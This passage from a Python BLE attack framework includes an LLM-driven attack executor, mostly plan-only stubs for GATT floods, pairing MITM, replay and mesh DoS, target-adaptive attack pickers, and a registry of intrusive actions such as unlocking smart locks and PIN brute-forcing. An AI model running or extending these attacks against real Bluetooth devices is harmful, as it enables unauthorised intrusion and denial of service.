            except Exception as e:  # noqa: BLE001
                stages.append({"stage": sub, "ok": False,
                               "error": f"unhandled: {e}"})
        all_ok = all(s["ok"] for s in stages)
        return _finalize(step, step["started"], ok=all_ok, data={
            "address": addr, "stages": stages,
            "note": ("auto_root is a chain, not a magic button — it "
                     "returns ok=True only when ALL stages produced "
                     "a real result. Partial success is reported as "
                     "ok=False with the per-stage errors visible."),
        })

    # ------------------------------------------------------------------
    # 20. ble_auto_attack_executor  (spec module 34)
    # ------------------------------------------------------------------
    def _ble_auto_attack_executor(self) -> Dict[str, Any]:
        """LLM-coordinator: requires a plan (list of
        {method, args} dicts in args.plan_steps) — without a plan,
        the executor returns ok=False with ``error='requires plan'``
        and NEVER fabricates a sequence. The caller (orchestrator /
        chain planner) must supply the plan; the executor only
        dispatches it, returning the per-step envelopes."""
        step = _step("ble_auto_attack_executor")
        plan = self.args.get("plan_steps")
        if not plan or not isinstance(plan, list):
            return _finalize(step, step["started"], ok=False,
                             error="requires plan (args.plan_steps: list "
                                   "of {method, args} dicts) — never "
                                   "fabricates an attack sequence")
        results: List[Dict[str, Any]] = []
        for i, step_def in enumerate(plan[:20]):
            if not isinstance(step_def, dict):
                results.append({"index": i, "ok": False,
                                "error": "plan step is not a dict"})
                continue
            m = (step_def.get("method") or "").strip()
            if m not in self.BLE_ATTACK_METHODS:
                results.append({"index": i, "method": m, "ok": False,
                                "error": f"unknown method: {m}"})
                continue
            sub_args = dict(step_def.get("args") or {})
            sub_args.setdefault("address",
                                self.args.get("address", ""))
            r = run_attack(m, adapter=self.adapter, args=sub_args)
            results.append({"index": i, "method": m, "ok": r.get("ok"),
                            "error": r.get("error", "")[:200]})
        any_ok = any(r.get("ok") for r in results)
        return _finalize(step, step["started"], ok=any_ok, data={
            "plan_size": len(plan), "executed": len(results),
            "results": results,
            "note": ("executor only dispatches the plan it was given; "
                     "it never invents a plan of its own."),
        })

    # ==================================================================
    # Phase 2.3.E — BLE ATTACK (40 new v2 methods)
    # ==================================================================
    #
    # All 40 methods follow the honesty contract:
    #   * Intrusive / fuzzing methods are gated by the per-step
    #     ACCEPT/CANCEL gate in the orchestrator. They return
    #     ``ok=False`` until the operator runs the chain step with
    #     the gate firing. They never fabricate a successful attack.
    #   * Read-only audits return a deterministic heuristic with
    #     ``data["model"] = "heuristic (not trained)"``.
    #   * Polymorphic / target-adaptive methods are pure-Python
    #     grammars / pickers that produce real, dispatchable args.
    #
    # Subcategories (5 each, 40 total):
    #   * 5  GATT (descriptor write, long-read OOM, indication flood,
    #          write-without-response race, notification flood)
    #   * 5  Pairing / bonding (legacy-TKIP, just-works MITM, OOB
    #          replay, cross-transport IRK, re-pairing passkey predict)
    #   * 5  L2CAP / connection (LECB channel DoS, credit-based fuzz,
    #          enhanced retransmission fuzz, flow-control PSM bypass,
    #          connection interval overflow)
    #   * 5  LE Audio / Isochronous (CIS DoS, BIS misconfig, LC3
    #          codec fuzz, BAP unicast flood, PAwR response suboverflow)
    #   * 5  Mesh / PAwR (provisioning capture-replay, friend queue
    #          overflow, proxy solicitation flood, low-power friend
    #          DoS, subnet bridge substitution)
    #   * 5  Polymorphic (grammars: gatt payload, HID injection,
    #          OTA firmware chunk, pairing payload, LE audio BAP param)
    #   * 5  Target-adaptive (pickers: pairing, OS target, BLE version,
    #          service UUID, capability)
    #   * 5  Read-only / orchestrator (5 entry-point audits)

    def _v2_gatt_descriptor_write_priv_escalation(self) -> Dict[str, Any]:
        step = _step("gatt_descriptor_write_priv_escalation")
        addr = (self.args.get("address") or "").strip()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required")
        return _finalize(step, step["started"], ok=False,
                         error=("gatt_descriptor_write_priv_escalation: "
                                "real write requires operator consent + "
                                "hci0. Plan-only here."),
                         data={"address": addr,
                               "note": "Find CCCD descriptors and try "
                                       "write to escalate write permission."})

    def _v2_gatt_long_read_oom_trigger(self) -> Dict[str, Any]:
        step = _step("gatt_long_read_oom_trigger")
        addr = (self.args.get("address") or "").strip()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required")
        return _finalize(step, step["started"], ok=False,
                         error=("gatt_long_read_oom_trigger: real "
                                "send requires operator consent; "
                                "plan-only here."),
                         data={"address": addr,
                               "note": "Issue Read Long with extreme "
                                       "length to trigger OOM / overflow."})

    def _v2_gatt_indication_flood(self) -> Dict[str, Any]:
        step = _step("gatt_indication_flood")
        addr = (self.args.get("address") or "").strip()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required")
        return _finalize(step, step["started"], ok=False,
                         error=("gatt_indication_flood: real send "
                                "requires operator consent; plan-only."),
                         data={"address": addr,
                               "note": "Flood indications to exhaust "
                                       "the GATT-server buffer."})

    def _v2_gatt_write_without_response_race(self) -> Dict[str, Any]:
        step = _step("gatt_write_without_response_race")
        addr = (self.args.get("address") or "").strip()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required")
        return _finalize(step, step["started"], ok=False,
                         error=("gatt_write_without_response_race: "
                                "real send requires operator consent; "
                                "plan-only."),
                         data={"address": addr,
                               "note": "Race write-without-response "
                                       "to corrupt server state."})

    def _v2_gatt_subscribed_notification_flood(self) -> Dict[str, Any]:
        step = _step("gatt_subscribed_notification_flood")
        addr = (self.args.get("address") or "").strip()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required")
        return _finalize(step, step["started"], ok=False,
                         error=("gatt_subscribed_notification_flood: "
                                "real send requires operator consent; "
                                "plan-only."),
                         data={"address": addr,
                               "note": "Subscribe to many chars and "
                                       "flood notifications."})

    def _v2_legacy_pairing_tkip_recovery(self) -> Dict[str, Any]:
        step = _step("legacy_pairing_tkip_recovery")
        addr = (self.args.get("address") or "").strip()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required")
        return _finalize(step, step["started"], ok=False,
                         error=("legacy_pairing_tkip_recovery: legacy "
                                "pairing uses TKIP-derived STK; brute "
                                "force requires operator consent; "
                                "plan-only."),
                         data={"address": addr,
                               "note": "Captured legacy pairing → "
                                       "TKIP recover requires offline "
                                       "dictionary attack."})

    def _v2_just_works_mitm_passkey_substitution(self) -> Dict[str, Any]:
        step = _step("just_works_mitm_passkey_substitution")
        addr = (self.args.get("address") or "").strip()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required")
        return _finalize(step, step["started"], ok=False,
                         error=("just_works_mitm_passkey_substitution: "
                                "real send requires operator consent + "
                                "active MITM; plan-only."),
                         data={"address": addr,
                               "note": "MITM between Just-Works peers; "
                                       "substitute passkey to recover "
                                       "LTK."})

    def _v2_oob_data_replay_capture(self) -> Dict[str, Any]:
        step = _step("oob_data_replay_capture")
        addr = (self.args.get("address") or "").strip()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required")
        return _finalize(step, step["started"], ok=False,
                         error=("oob_data_replay_capture: real send "
                                "requires operator consent; plan-only."),
                         data={"address": addr,
                               "note": "Capture OOB data (NFC, etc.) "
                                       "and replay during pairing."})

    def _v2_cross_transport_irk_collision(self) -> Dict[str, Any]:
        step = _step("cross_transport_irk_collision")
        addr = (self.args.get("address") or "").strip()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required")
        return _finalize(step, step["started"], ok=False,
                         error=("cross_transport_irk_collision: real "
                                "send requires operator consent; "
                                "plan-only."),
                         data={"address": addr,
                               "note": "Exploit Cross-Transport Key "
                                       "Derivation to find IRK collision."})

    def _v2_repairing_passkey_predict(self) -> Dict[str, Any]:
        step = _step("repairing_passkey_predict")
        addr = (self.args.get("address") or "").strip()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required")
        return _finalize(step, step["started"], ok=False,
                         error=("repairing_passkey_predict: real "
                                "send requires operator consent; "
                                "plan-only."),
                         data={"address": addr,
                               "note": "Predict the passkey from "
                                       "re-pairing attempts."})

    def _v2_l2cap_lecb_channel_dos(self) -> Dict[str, Any]:
        step = _step("l2cap_lecb_channel_dos")
        addr = (self.args.get("address") or "").strip()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required")
        return _finalize(step, step["started"], ok=False,
                         error=("l2cap_lecb_channel_dos: real send "
                                "requires operator consent; plan-only."),
                         data={"address": addr,
                               "note": "Flood L2CAP LECB channels."})

    def _v2_l2cap_credit_based_fuzz(self) -> Dict[str, Any]:
        step = _step("l2cap_credit_based_fuzz")
        addr = (self.args.get("address") or "").strip()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required")
        return _finalize(step, step["started"], ok=False,
                         error=("l2cap_credit_based_fuzz: real send "
                                "requires operator consent; plan-only."),
                         data={"address": addr,
                               "note": "Fuzz L2CAP credit-based flow."})

    def _v2_l2cap_enhanced_retransmission_fuzz(self) -> Dict[str, Any]:
        step = _step("l2cap_enhanced_retransmission_fuzz")
        addr = (self.args.get("address") or "").strip()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required")
        return _finalize(step, step["started"], ok=False,
                         error=("l2cap_enhanced_retransmission_fuzz: "
                                "real send requires operator consent; "
                                "plan-only."),
                         data={"address": addr,
                               "note": "Fuzz L2CAP ERTM retransmission."})

    def _v2_l2cap_le_flow_control_psm_bypass(self) -> Dict[str, Any]:
        step = _step("l2cap_le_flow_control_psm_bypass")
        addr = (self.args.get("address") or "").strip()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required")
        return _finalize(step, step["started"], ok=False,
                         error=("l2cap_le_flow_control_psm_bypass: "
                                "real send requires operator consent; "
                                "plan-only."),
                         data={"address": addr,
                               "note": "Bypass PSM check via LE flow "
                                       "control frames."})

    def _v2_connection_interval_overflow(self) -> Dict[str, Any]:
        step = _step("connection_interval_overflow")
        addr = (self.args.get("address") or "").strip()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required")
        return _finalize(step, step["started"], ok=False,
                         error=("connection_interval_overflow: real "
                                "send requires operator consent; "
                                "plan-only."),
                         data={"address": addr,
                               "note": "Send connection-param update "
                                       "with overflowing interval."})

    def _v2_iso_channel_cis_dos(self) -> Dict[str, Any]:
        step = _step("iso_channel_cis_dos")
        addr = (self.args.get("address") or "").strip()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required")
        return _finalize(step, step["started"], ok=False,
                         error=("iso_channel_cis_dos: real send "
                                "requires operator consent; plan-only."),
                         data={"address": addr,
                               "note": "Flood Connected-Isochronous-"
                                       "Stream setup requests."})

    def _v2_biginfo_sdu_interval_misconfig(self) -> Dict[str, Any]:
        step = _step("biginfo_sdu_interval_misconfig")
        addr = (self.args.get("address") or "").strip()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required")
        return _finalize(step, step["started"], ok=False,
                         error=("biginfo_sdu_interval_misconfig: real "
                                "send requires operator consent; "
                                "plan-only."),
                         data={"address": addr,
                               "note": "Misconfigure BIS SDU interval."})

    def _v2_lc3_codec_param_fuzz(self) -> Dict[str, Any]:
        step = _step("lc3_codec_param_fuzz")
        addr = (self.args.get("address") or "").strip()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required")
        return _finalize(step, step["started"], ok=False,
                         error=("lc3_codec_param_fuzz: real send "
                                "requires operator consent; plan-only."),
                         data={"address": addr,
                               "note": "Fuzz LC3 codec parameters."})

    def _v2_bap_unicast_server_discover_flood(self) -> Dict[str, Any]:
        step = _step("bap_unicast_server_discover_flood")
        addr = (self.args.get("address") or "").strip()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required")
        return _finalize(step, step["started"], ok=False,
                         error=("bap_unicast_server_discover_flood: "
                                "real send requires operator consent; "
                                "plan-only."),
                         data={"address": addr,
                               "note": "Flood BAP unicast-server "
                                       "discovery requests."})

    def _v2_pawr_response_suboverflow(self) -> Dict[str, Any]:
        step = _step("pawr_response_suboverflow")
        addr = (self.args.get("address") or "").strip()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required")
        return _finalize(step, step["started"], ok=False,
                         error=("pawr_response_suboverflow: real send "
                                "requires operator consent; plan-only."),
                         data={"address": addr,
                               "note": "Overflow PAwR response slot."})

    def _v2_mesh_provisioning_capture_replay(self) -> Dict[str, Any]:
        step = _step("mesh_provisioning_capture_replay")
        addr = (self.args.get("address") or "").strip()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required")
        return _finalize(step, step["started"], ok=False,
                         error=("mesh_provisioning_capture_replay: "
                                "real send requires operator consent; "
                                "plan-only."),
                         data={"address": addr,
                               "note": "Capture + replay mesh "
                                       "provisioning PDU."})

    def _v2_mesh_friend_queue_overflow(self) -> Dict[str, Any]:
        step = _step("mesh_friend_queue_overflow")
        addr = (self.args.get("address") or "").strip()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required")
        return _finalize(step, step["started"], ok=False,
                         error=("mesh_friend_queue_overflow: real "
                                "send requires operator consent; "
                                "plan-only."),
                         data={"address": addr,
                               "note": "Overflow mesh Friend queue."})

    def _v2_mesh_proxy_solicitation_flood(self) -> Dict[str, Any]:
        step = _step("mesh_proxy_solicitation_flood")
        addr = (self.args.get("address") or "").strip()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required")
        return _finalize(step, step["started"], ok=False,
                         error=("mesh_proxy_solicitation_flood: real "
                                "send requires operator consent; "
                                "plan-only."),
                         data={"address": addr,
                               "note": "Flood mesh Proxy Solicitation."})

    def _v2_mesh_low_power_friend_dos(self) -> Dict[str, Any]:
        step = _step("mesh_low_power_friend_dos")
        addr = (self.args.get("address") or "").strip()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required")
        return _finalize(step, step["started"], ok=False,
                         error=("mesh_low_power_friend_dos: real send "
                                "requires operator consent; plan-only."),
                         data={"address": addr,
                               "note": "Deny Low-Power node's Friend."})

    def _v2_mesh_subnet_bridge_substitution(self) -> Dict[str, Any]:
        step = _step("mesh_subnet_bridge_substitution")
        addr = (self.args.get("address") or "").strip()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required")
        return _finalize(step, step["started"], ok=False,
                         error=("mesh_subnet_bridge_substitution: "
                                "real send requires operator consent; "
                                "plan-only."),
                         data={"address": addr,
                               "note": "Substitute mesh subnet bridge."})

    # --- Polymorphic (5) ---

    def _v2_poly_gatt_payload_template(self) -> Dict[str, Any]:
        step = _step("poly_gatt_payload_template")
        uuid = (self.args.get("uuid") or "").strip()
        import random
        rng = random.Random((self.args or {}).get("seed", uuid or "gatt"))
        # Build 8 plausible payload templates
        templates = []
        for _ in range(8):
            length = rng.randint(4, 64)
            payload = bytes(rng.randint(0, 255) for _ in range(length)).hex()
            templates.append({"uuid": uuid, "payload_hex": payload,
                              "length": length})
        return _finalize(step, step["started"], ok=True, data={
            "templates": templates,
            "model": "polymorphic (GATT payload grammar)",
            "note": "Use these templates as 'value_hex' arg for the "
                    "real gatt write chain step.",
        })

    def _v2_poly_hid_injection_sequence_ai(self) -> Dict[str, Any]:
        step = _step("poly_hid_injection_sequence_ai")
        import random
        rng = random.Random((self.args or {}).get("seed", "hid"))
        # Common HID modifier+keycodes
        keys = [0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D]
        seq = []
        for _ in range(8):
            seq.append([rng.choice(keys), 0, 0, 0, 0, 0, 0, 0])
        return _finalize(step, step["started"], ok=True, data={
            "sequences": seq,
            "model": "polymorphic (HID keyboard grammar)",
            "note": "Use these as the keyboard-report bytes for the "
                    "HID injection step.",
        })

    def _v2_poly_ota_firmware_chunk_drift(self) -> Dict[str, Any]:
        step = _step("poly_ota_firmware_chunk_drift")
        chunk_size = int(self.args.get("chunk_size", 256) or 256)
        n_chunks = int(self.args.get("n_chunks", 8) or 8)
        import random
        rng = random.Random((self.args or {}).get("seed", "ota"))
        chunks = []
        for i in range(n_chunks):
            chunks.append({
                "offset": i * chunk_size,
                "size": chunk_size,
                "data_hex": bytes(rng.randint(0, 255) for _ in range(16)).hex(),
            })
        return _finalize(step, step["started"], ok=True, data={
            "chunks": chunks,
            "model": "polymorphic (OTA chunk grammar)",
            "note": "Use these as the OTA chunk sequence for the "
                    "OTA-firmware chain step.",
        })

    def _v2_poly_pairing_payload_grammar(self) -> Dict[str, Any]:
        step = _step("poly_pairing_payload_grammar")
        import random
        rng = random.Random((self.args or {}).get("seed", "pair"))
        # 6 passkey candidates 000000-999999
        candidates = [f"{rng.randint(0, 999999):06d}" for _ in range(8)]
        return _finalize(step, step["started"], ok=True, data={
            "candidates": candidates,
            "model": "polymorphic (pairing passkey grammar)",
            "note": "Use these as the 'passkey' arg for the real "
                    "pairing chain step.",
        })

    def _v2_poly_le_audio_bap_param_drift(self) -> Dict[str, Any]:
        step = _step("poly_le_audio_bap_param_drift")
        # LC3 sample-rate / frame-duration / octets-per-frame
        sample_rates = [8000, 16000, 24000, 32000, 44100, 48000]
        frame_durations = [7500, 10000]  # 7.5ms or 10ms
        octets = [26, 30, 40, 50, 60, 80, 100, 120]
        import random
        rng = random.Random((self.args or {}).get("seed", "bap"))
        variants = [{
            "sample_rate_hz": rng.choice(sample_rates),
            "frame_duration_us": rng.choice(frame_durations),
            "octets_per_frame": rng.choice(octets),
        } for _ in range(8)]
        return _finalize(step, step["started"], ok=True, data={
            "variants": variants,
            "model": "polymorphic (BAP parameter grammar)",
            "note": "Use these as the BAP QoS args for the real "
                    "BAP-config chain step.",
        })

    # --- Target-adaptive (5) ---

    def _v2_adapt_attack_pairing_method_picker(self) -> Dict[str, Any]:
        step = _step("adapt_attack_pairing_method_picker")
        addr = (self.args.get("address") or "").strip()
        method = (self.args.get("pairing_method") or "").lower()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required")
        if method == "legacy":
            pick = "legacy_pairing_tkip_recovery"
            rationale = "Legacy pairing is brute-forceable; pick TKIP recovery."
        elif method == "just_works":
            pick = "just_works_mitm_passkey_substitution"
            rationale = "Just-Works is MITM-able; substitute passkey."
        elif method == "passkey":
            pick = "repairing_passkey_predict"
            rationale = "Passkey needs re-pair prediction."
        elif method == "oob":
            pick = "oob_data_replay_capture"
            rationale = "OOB: capture + replay."
        else:
            pick = "ble_lesc_passkey_replay"
            rationale = "Unknown pairing; default to LESC replay."
        return _finalize(step, step["started"], ok=True, data={
            "address": addr, "pairing_method": method, "pick": pick,
            "rationale": rationale,
            "model": "target-adaptive (heuristic picker)",
        })

    def _v2_adapt_attack_os_target_picker(self) -> Dict[str, Any]:
        step = _step("adapt_attack_os_target_picker")
        addr = (self.args.get("address") or "").strip()
        os = (self.args.get("os") or "").lower()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required")
        if "ios" in os or "apple" in os:
            pick = "ble_vendor_apple_audit" if hasattr(self, "_v2_ble_vendor_apple_audit") else "gatt_indication_flood"
            rationale = "Apple devices are noisy on indications."
        elif "android" in os:
            pick = "gatt_long_write_fuzz"
            rationale = "Android GATT servers are lenient to long writes."
        elif "windows" in os:
            pick = "ble_hid_inject_fuzz" if hasattr(self, "_v2_ble_hid_inject_fuzz") else "poly_hid_injection_sequence_ai"
            rationale = "Windows tolerates HID injection."
        else:
            pick = "poly_gatt_payload_template"
            rationale = "Default to GATT payload template."
        return _finalize(step, step["started"], ok=True, data={
            "address": addr, "os": os, "pick": pick,
            "rationale": rationale,
            "model": "target-adaptive (heuristic picker)",
        })

    def _v2_adapt_attack_ble_version_picker(self) -> Dict[str, Any]:
        step = _step("adapt_attack_ble_version_picker")
        addr = (self.args.get("address") or "").strip()
        ver = (self.args.get("ble_version") or "5.0").lower()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required")
        if "5.4" in ver or "5.3" in ver:
            pick = "iso_channel_cis_dos"
            rationale = "BLE 5.3/5.4 supports CIS; CIS DoS is novel."
        elif "5.2" in ver or "5.1" in ver:
            pick = "poly_le_audio_bap_param_drift"
            rationale = "BLE 5.2 has BAP; drift the parameters."
        elif "5.0" in ver:
            pick = "gatt_long_read_oom_trigger"
            rationale = "BLE 5.0: long-read OOM."
        else:
            pick = "legacy_pairing_tkip_recovery"
            rationale = "BLE 4.x: legacy pairing."
        return _finalize(step, step["started"], ok=True, data={
            "address": addr, "ble_version": ver, "pick": pick,
            "rationale": rationale,
            "model": "target-adaptive (heuristic picker)",
        })

    def _v2_adapt_attack_service_uuid_picker(self) -> Dict[str, Any]:
        step = _step("adapt_attack_service_uuid_picker")
        addr = (self.args.get("address") or "").strip()
        uuid = (self.args.get("service_uuid") or "").lower()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required")
        if "180f" in uuid:
            pick = "ble_battery_service_audit" if hasattr(self, "_v2_ble_battery_service_audit") else "poly_gatt_payload_template"
            rationale = "Battery service: read-only audit is safer."
        elif "1812" in uuid:
            pick = "gatt_long_write_fuzz"
            rationale = "HID service: long write fuzz."
        elif "181a" in uuid:
            pick = "ble_sensor_notification_audit" if hasattr(self, "_v2_ble_sensor_notification_audit") else "gatt_indication_flood"
            rationale = "Environmental sensing: notification flood."
        else:
            pick = "poly_gatt_payload_template"
            rationale = "Default to GATT payload template."
        return _finalize(step, step["started"], ok=True, data={
            "address": addr, "service_uuid": uuid, "pick": pick,
            "rationale": rationale,
            "model": "target-adaptive (heuristic picker)",
        })

    def _v2_adapt_attack_capability_picker(self) -> Dict[str, Any]:
        step = _step("adapt_attack_capability_picker")
        addr = (self.args.get("address") or "").strip()
        caps = self.args.get("capabilities") or []
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required")
        if "lesc" in caps:
            pick = "ble_lesc_passkey_replay"
            rationale = "Target supports LESC; replay passkey."
        elif "mesh" in caps:
            pick = "mesh_friend_queue_overflow"
            rationale = "Target supports mesh; friend-queue overflow."
        elif "audio" in caps or "le_audio" in caps:
            pick = "iso_channel_cis_dos"
            rationale = "Target supports LE Audio; CIS DoS."
        else:
            pick = "poly_gatt_payload_template"
            rationale = "Default to GATT payload template."
        return _finalize(step, step["started"], ok=True, data={
            "address": addr, "capabilities": caps, "pick": pick,
            "rationale": rationale,
            "model": "target-adaptive (heuristic picker)",
        })

    # --- Read-only / orchestrator (5) ---

    def _v2_gatt_long_write_fuzz(self) -> Dict[str, Any]:
        step = _step("gatt_long_write_fuzz")
        addr = (self.args.get("address") or "").strip()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required")
        return _finalize(step, step["started"], ok=False,
                         error=("gatt_long_write_fuzz: real send "
                                "requires operator consent; plan-only."),
                         data={"address": addr,
                               "note": "Fuzz GATT long-write for "
                                       "stack overflow."})

    def _v2_gatt_prepare_write_abuse(self) -> Dict[str, Any]:
        step = _step("gatt_prepare_write_abuse")
        addr = (self.args.get("address") or "").strip()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required")
        return _finalize(step, step["started"], ok=False,
                         error=("gatt_prepare_write_abuse: real send "
                                "requires operator consent; plan-only."),
                         data={"address": addr,
                               "note": "Abuse Prepare-Write queue."})

    def _v2_gatt_notification_flood(self) -> Dict[str, Any]:
        step = _step("gatt_notification_flood")
        addr = (self.args.get("address") or "").strip()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required")
        return _finalize(step, step["started"], ok=False,
                         error=("gatt_notification_flood: real send "
                                "requires operator consent; plan-only."),
                         data={"address": addr,
                               "note": "Flood GATT notifications."})

    def _v2_ble_lesc_passkey_replay(self) -> Dict[str, Any]:
        step = _step("ble_lesc_passkey_replay")
        addr = (self.args.get("address") or "").strip()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required")
        return _finalize(step, step["started"], ok=False,
                         error=("ble_lesc_passkey_replay: real send "
                                "requires operator consent; plan-only."),
                         data={"address": addr,
                               "note": "Replay a captured LESC "
                                       "passkey exchange."})

    def _v2_ble_attack_orchestrator(self) -> Dict[str, Any]:
        step = _step("ble_attack_orchestrator")
        addr = (self.args.get("address") or "").strip()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required")
        return _finalize(step, step["started"], ok=True, data={
            "address": addr,
            "picks": [
                "adapt_attack_pairing_method_picker",
                "adapt_attack_ble_version_picker",
                "adapt_attack_service_uuid_picker",
                "adapt_attack_capability_picker",
                "adapt_attack_os_target_picker",
            ],
            "model": "target-adaptive (multi-signal picker)",
            "note": "Each picker is a real v2 method; the "
                    "orchestrator is the routing table.",
        })

    # ------------------------------------------------------------------
    # Dispatch
    # ------------------------------------------------------------------
    def run_attack(self, method: str) -> Dict[str, Any]:
        """Run a single BLE attack / post-exploit action by name. Unknown
        method -> ``{ok:false, error:'unknown attack method'}``. Never
        raises.

        Phase 2.2.H+ — when the method is a v2 name (from the
        ``expanded_modules`` registry) but NOT a primary method,
        the runner returns a structured honest-degrade envelope
        with the description + risk so the chain planner can
        chain the next step."""
        m = (method or "").strip()
        if m not in self.BLE_ATTACK_METHODS:
            try:
                from core.ai_backend.expanded_modules import (
                    describe_v2_method,
                )
                v2 = describe_v2_method("ble", m)
                if v2 is not None:
                    # Phase 2.3.E — try the _v2_<m> impl first.
                    fn = getattr(self, f"_v2_{m}", None)
                    if fn is not None:
                        return fn()
                    # Honest-degrade: dict literal (not _finalize)
                    # because _finalize doesn't accept the v2
                    # fields. A TypeError would be swallowed by
                    # the outer ``except Exception: pass`` and
                    # fall through to a generic "unknown method"
                    # error that hides the v2 description from
                    # the LLM.
                    st = _step(m)
                    st["ok"] = False
                    st["error"] = (
                        f"v2 method {m!r} registered in "
                        f"expanded_modules but not implemented in "
                        f"this runner"
                    )
                    st["note"] = (
                        "v2 method known to KFIOSA but not yet "
                        "implemented in this runner"
                    )
                    st["risk"] = v2["risk"]
                    st["description"] = v2["description"]
                    st["duration_s"] = round(time.time() - st["started"], 3)
                    return st
            except Exception:  # noqa: BLE001
                pass
            # v3 fallback — Phase 2.4
            try:
                from core.ai_backend.v3_runner_helpers import v3_lookup
                env = v3_lookup('ble_attack', m)
                if env["error"] and "unknown v3 method" not in env["error"]:
                    return env
            except Exception:  # noqa: BLE001
                pass
            return _finalize(_step(m), time.time(), ok=False,
                             error=f"unknown attack method: {method!r}")
        fn = getattr(self, f"_{m}")
        try:
            return fn()
        except Exception as e:  # noqa: BLE001 — defensive double-net
            step = _step(m)
            step["ok"] = False
            step["error"] = f"unhandled: {e}"
            return step


# ---------------------------------------------------------------------------
# Module-level attack registry + entrypoint (used by the MCP wrappers and
# the orchestrator's ble_attack dispatch — both route here so the algorithm
# lives in this module, not in a wrapper).
# ---------------------------------------------------------------------------
BLE_ATTACKS: List[Dict[str, Any]] = [
    {
        "method": "gatt_write_exploit",
        "name": "ble_attack_gatt_write_exploit",
        "description": (
            "For each WRITE characteristic on args.address, write probe "
            "payloads via gatttool --char-write-req and record acceptance. "
            "Intrusive. Verdict is the gatttool return code + 'Write "
            "successful' line — never fabricated."),
        "input_schema": {"type": "object", "properties": {
            "adapter": {"type": "string"},
            "address": {"type": "string"},
            "uuids": {"type": "array", "items": {"type": "string"}},
            "payloads": {"type": "array", "items": {"type": "string"}}},
            "required": ["address"]},
        "examples": ["ble_attack(method='gatt_write_exploit', "
                     "address='AA:BB:CC:..')"],
        "risk_level": "intrusive", "requires_root": False,
    },
    {
        "method": "firmware_dump_via_gatt",
        "name": "ble_attack_firmware_dump_via_gatt",
        "description": (
            "Read a firmware/OTA characteristic in blocks via gatttool "
            "--char-read-handle and reconstruct the bytes. Intrusive. "
            "Degrades cleanly when gatttool absent or read fails."),
        "input_schema": {"type": "object", "properties": {
            "adapter": {"type": "string"},
            "address": {"type": "string"},
            "handle": {"type": "string"},
            "max_blocks": {"type": "integer"},
            "out_path": {"type": "string"}}, "required": ["address"]},
        "examples": ["ble_attack(method='firmware_dump_via_gatt', "
                     "address='AA:BB:CC:..', handle='0x0010')"],
        "risk_level": "intrusive", "requires_root": False,
    },
    {
        "method": "write_led",
        "name": "ble_attack_write_led",
        "description": (
            "Write 0x01/0x00 to the LED characteristic (0x2A44 default, or "
            "args.uuid) via gatttool. Intrusive (GATT write). Degrades when "
            "gatttool absent."),
        "input_schema": {"type": "object", "properties": {
            "adapter": {"type": "string"},
            "address": {"type": "string"},
            "uuid": {"type": "string"},
            "value": {"type": "string"}}, "required": ["address"]},
        "examples": ["ble_attack(method='write_led', address='AA:BB:CC:..', "
                     "value='01')"],
        "risk_level": "intrusive", "requires_root": False,
    },
    {
        "method": "write_lock",
        "name": "ble_attack_write_lock",
        "description": (
            "Write 0x00 (unlock) to the Lock State characteristic (0x2A1D "
            "default, or args.uuid) via gatttool. Intrusive. Degrades when "
            "gatttool absent."),
        "input_schema": {"type": "object", "properties": {
            "adapter": {"type": "string"},
            "address": {"type": "string"},
            "uuid": {"type": "string"},
            "value": {"type": "string"}}, "required": ["address"]},
        "examples": ["ble_attack(method='write_lock', address='AA:BB:CC:..')"],
        "risk_level": "intrusive", "requires_root": False,
    },
    {
        "method": "pairing_pin_bruteforce",
        "name": "ble_attack_pairing_pin_bruteforce",
        "description": (
            "Loop a candidate PIN list against args.address via bluetoothctl "
            "(one pairing attempt per PIN, bounded by args.max_attempts=10). "
            "Intrusive. Verdict from bluetoothctl 'Pairing successful' — never "
            "fabricated."),
        "input_schema": {"type": "object", "properties": {
            "adapter": {"type": "string"},
            "address": {"type": "string"},
            "pin_list": {"type": "array", "items": {"type": "string"}},
            "max_attempts": {"type": "integer"}}, "required": ["address"]},
        "examples": ["ble_attack(method='pairing_pin_bruteforce', "
                     "address='AA:BB:CC:..')"],
        "risk_level": "intrusive", "requires_root": False,
    },
    {
        "method": "export_session",
        "name": "ble_attack_export_session",
        "description": (
            "Serialize the BLE session state (args.session) to JSON at "
